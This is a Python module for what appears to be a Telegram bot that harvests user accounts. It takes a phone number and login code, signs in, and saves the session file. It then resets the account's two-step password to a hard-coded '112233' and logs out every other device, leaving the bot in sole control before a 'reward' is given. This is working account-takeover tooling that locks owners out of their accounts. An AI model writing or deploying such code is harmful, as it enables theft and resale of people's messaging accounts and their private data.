import os
import asyncio
from tempfile import NamedTemporaryFile
from telethon.sync import TelegramClient
from config import API_ID, API_HASH, SESSIONS_DIR
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest


class SessionManager:
    def __init__(self):
        self.user_states = {}

    async def start_verification(self, user_id, phone_number):
        try:
            with NamedTemporaryFile(prefix='tmp_', suffix='.session', dir=SESSIONS_DIR, delete=False) as tmp:
                temp_path = tmp.name
            client = TelegramClient(temp_path, API_ID, API_HASH)
            await client.connect()
            sent = await client.send_code_request(phone_number)

            self.user_states[user_id] = {
                "phone": phone_number,
                "session_path": temp_path,
                "client": client,
                "phone_code_hash": sent.phone_code_hash,
                "state": "awaiting_code"
            }
            return "code_sent", "Verification code sent"
        except Exception as e:
            return "error", str(e)

    async def verify_code(self, user_id, code):
        state = self.user_states.get(user_id)
        if not state:
            return "error", "Session expired"

        client = state["client"]
        try:
            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
        except SessionPasswordNeededError:
            state["state"] = "awaiting_password"
            return "password_needed", None
        except Exception as e:
            if os.path.exists(state["session_path"]):
                os.unlink(state["session_path"])
            return "error", str(e)

        # Set 2FA password to "112233" and logout other devices
        try:
            # Set 2FA password
            if await client.edit_2fa(new_password="112233", hint="auto-set by bot"):
                # Logout other devices to ensure only 1 device is logged in
                await self.logout_other_devices(client)
                self._save_session(state, client)
                return "verified_and_secured", None
            else:
                return "error", "Failed to set initial 2FA"
        except Exception as e:
            return "error", f"2FA setup failed: {str(e)}"

    async def verify_password(self, user_id, password):
        state = self.user_states.get(user_id)
        if not state:
            return "error", "Session expired"
        client = state["client"]

        try:
            await client.sign_in(password=password)
        except Exception:
            return "error", "Current 2FA password is incorrect."

        # Update 2FA password to "112233" and logout other devices
        try:
            if await client.edit_2fa(current_password=password, new_password="112233"):
                # Logout other devices to ensure only 1 device is logged in
                await self.logout_other_devices(client)
                self._save_session(state, client)
                return "verified_and_secured", None
            else:
                return "error", "Failed to update 2FA password"
        except Exception as e:
            return "error", f"2FA update failed: {str(e)}"

    def finalize_session(self, user_id):
        state = self.user_states.get(user_id)
        if not state:
            return False
        client = state["client"]
        try:
            self._save_session(state, client)
            # Clean up user state after successful finalization
            self.user_states.pop(user_id, None)
            return True
        except Exception as e:
            print(f"❌ Failed to save session: {str(e)}")
            return False

    async def cleanup_session(self, user_id):
        """Clean up session state and disconnect client (for cancellation)"""
        state = self.user_states.get(user_id)
        if not state:
            return
        
        try:
            client = state.get("client")
            if client and client.is_connected():
                await client.disconnect()
                print(f"✅ Disconnected client for user {user_id}")
        except Exception as e:
            print(f"Error disconnecting client for user {user_id}: {e}")
        finally:
            # Remove user state regardless
            self.user_states.pop(user_id, None)
            print(f"✅ Cleaned up session state for user {user_id}")

    async def logout_other_devices(self, client):
        try:
            auths = await client(GetAuthorizationsRequest())
            sessions = auths.authorizations
            if len(sessions) <= 1:
                print("✅ Only one device logged in.")
                return True

            for session in sessions:
                if not session.current:
                    await client(ResetAuthorizationRequest(hash=session.hash))
                    print(f"🔒 Logged out: {session.device_model} | {session.app_name}")

            updated = await client(GetAuthorizationsRequest())
            if len(updated.authorizations) == 1:
                print("✅ Remaining session valid after logout.")
                return True

            print("❌ Still multiple sessions after logout.")
            return False
        except Exception as e:
            print(f"❌ Error during logout: {str(e)}")
            return False

    def _save_session(self, state, client):
        old_path = state["session_path"]
        phone_number = state["phone"]
        final_path = os.path.join(SESSIONS_DIR, f"{phone_number}.session")
        client.session.save()
        if os.path.exists(old_path):
            os.rename(old_path, final_path)

    def validate_session_before_reward(self, phone_number):
        """Synchronous wrapper for session validation"""
        session_path = os.path.join(SESSIONS_DIR, f"{phone_number}.session")
        if not os.path.exists(session_path):
            return False, "Session file does not exist."

        try:
            # Use a new event loop for this validation
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                result = loop.run_until_complete(self._async_validate_session(phone_number, session_path))
                return result
            finally:
                loop.close()
        except Exception as e:
            print(f"❌ Session validation error: {str(e)}")
            return False, f"Error verifying session: {str(e)}"

    async def _async_validate_session(self, phone_number, session_path):
        """Async session validation logic"""
        client = None
        try:
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()
            
            # Check current authorizations
            auths = await client(GetAuthorizationsRequest())
            if len(auths.authorizations) == 1:
                print(f"✅ Session OK for {phone_number}")
                return True, None

            print(f"⚠️ Multiple sessions detected. Attempting logout...")
            # Logout other devices
            for session in auths.authorizations:
                if not session.current:
                    try:
                        await client(ResetAuthorizationRequest(hash=session.hash))
                        print(f"🔒 Logged out device: {session.device_model}")
                    except Exception as logout_error:
                        print(f"Warning: Could not logout device: {logout_error}")

            # Wait and recheck
            await asyncio.sleep(5)  # Reduced wait time
            recheck = await client(GetAuthorizationsRequest())
            if len(recheck.authorizations) == 1:
                print("✅ Session now valid after cleanup.")
                return True, None

            print("❌ Multiple devices still logged in after cleanup.")
            return False, "Multiple devices still logged in. Please manually logout other devices."
            
        except Exception as e:
            print(f"❌ Validation error: {str(e)}")
            return False, f"Session validation failed: {str(e)}"
        finally:
            if client and client.is_connected():
                await client.disconnect()


# Global instance
session_manager = SessionManager()